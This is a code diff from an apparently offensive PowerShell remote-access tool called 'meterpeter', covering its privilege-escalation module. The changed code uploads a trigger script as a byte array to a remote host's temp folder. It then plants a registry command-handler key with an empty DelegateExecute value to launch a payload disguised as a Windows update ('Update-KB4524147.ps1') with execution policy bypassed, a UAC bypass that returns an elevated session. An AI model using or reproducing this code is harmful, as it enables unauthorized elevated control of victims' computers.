@@ -803,37 +803,37 @@ While($Client.Connected)
       $choise = Read-Host;
       If($choise -eq "Escalate" -or $choice -eq "escalate")
       {
-        write-host "`n`n   Modules   Description                     Remark" -ForegroundColor green;
-        write-host "   -------   -----------                     ------";
-        write-host "   Escal     Escalate Client Privs           Client:User  - Privileges required";
-        write-host "   Delete    Delete Priv Escal settings      Client:User  - Privileges required";
-        write-host "   Return    Return to Server Main Menu" -ForeGroundColor yellow;
+        write-host "   Modules     Description                  Remark" -ForegroundColor green;
+        write-host "   -------     -----------                  ------";
+        write-host "   GetSystem   Escalate Client Privs        Client:User  - Privileges required";
+        write-host "   Delete      Delete Priv Escal settings   Client:User  - Privileges required";
+        write-host "   Return      Return to Server Main Menu" -ForeGroundColor yellow;
         write-host "`n`n :meterpeter:Post:Escalate> " -NoNewline -ForeGroundColor Green;
         $Escal_choise = Read-Host;
-        If($Escal_choise -eq "Escal" -or $Escal_choise -eq "escal")
+        If($Escal_choise -eq "GetSystem" -or $Escal_choise -eq "getsystem")
         {
-          $name = "trigger.bat";
+          $name = "trigger.vbs";
           $File = "$Bin$name"
           If(([System.IO.File]::Exists("$File")))
           {
             write-host " Elevate Client ($payload_name.ps1) Privileges." -ForegroundColor Blue -BackgroundColor White;Start-Sleep -Seconds 1;write-host "`n`n";
             Write-Host "   Status     Delay       Remote Path" -ForeGroundColor green;
             Write-Host "   ------     -----       ----------";
-            Write-Host "   Uploaded   2(minutes) `$env:tmp\trigger.bat`n`n";
+            Write-Host "   Uploaded   2(minutes)  `$env:tmp\trigger.vbs`n`n";
             Write-Host "   [i] Exit|Restart meterpeter (use same ip|port|obfuscation)" -ForeGroundColor yellow;
             Write-Host "   [i] to recive the elevated Connection back in 2 minutes time." -ForeGroundColor yellow;
-            ## Write Local script (trigger.bat) to Remote-Host $env:tmp
+            ## Write Local script (trigger.vbs) to Remote-Host $env:tmp
             $FileBytes = [io.file]::ReadAllBytes("$File") -join ',';
             $FileBytes = "($FileBytes)";
             $File = $File.Split('\')[-1];
             $File = $File.Split('/')[-1];
-            $Command = "`$1=`"`$env:tmp\#`";`$2=@;If(!([System.IO.File]::Exists(`"`$1`"))){[System.IO.File]::WriteAllBytes(`"`$1`",`$2);`"`$1`"};`$cmdline = `"cmd /R start powershell -exec bypass -w 1 -File `$env:tmp\Update-KB4524147.ps1`";`$CommandPath = `"HKCU:\Software\Classes\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\Shell\open\command`";New-Item `$CommandPath -Force|Out-Null;New-ItemProperty -Path `$CommandPath -Name `"DelegateExecute`" -Value `"`" -Force|Out-Null;Set-ItemProperty -Path `$CommandPath -Name `"(default)`" -Value `$cmdline -Force -ErrorAction SilentlyContinue|Out-Null;echo `"   [i] Privilege Escalation: Exit meterpeter console and start a new handler`" `> privescal.txt;echo `"   [i] with same port number to recive the elevated session back in 2 minutes time.`" `>`> privescal.txt;Get-content privescal.txt;Remove-Item privescal.txt -Force;cmd /R start /min %tmp%\trigger.bat";
+            $Command = "`$1=`"`$env:tmp\#`";`$2=@;If(!([System.IO.File]::Exists(`"`$1`"))){[System.IO.File]::WriteAllBytes(`"`$1`",`$2);`"`$1`"};`$cmdline = `"cmd /R start powershell -exec bypass -w 1 -File `$env:tmp\Update-KB4524147.ps1`";`$CommandPath = `"HKCU:\Software\Classes\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\Shell\open\command`";New-Item `$CommandPath -Force|Out-Null;New-ItemProperty -Path `$CommandPath -Name `"DelegateExecute`" -Value `"`" -Force|Out-Null;Set-ItemProperty -Path `$CommandPath -Name `"(default)`" -Value `$cmdline -Force -ErrorAction SilentlyContinue|Out-Null;echo `"   Saved   `$env:tmp\trigger.vbs`" `> privescal.txt;cmd /R start %tmp%\trigger.vbs";
             ## $Command = Variable_Obfuscation(Character_Obfuscation($Command));
             $Command = $Command -replace "#","$File";
             $Command = $Command -replace "@","$FileBytes";
             $Upload = $True;
           }else{
-            ## Local File { trigger.bat } not found .
+            ## Local File { trigger.vbs } not found .
             Write-Host "`n`n   Status     Local Path" -ForeGroundColor green;
             Write-Host "   ------     ----------";
             Write-Host "   Not Found  $File" -ForeGroundColor red;
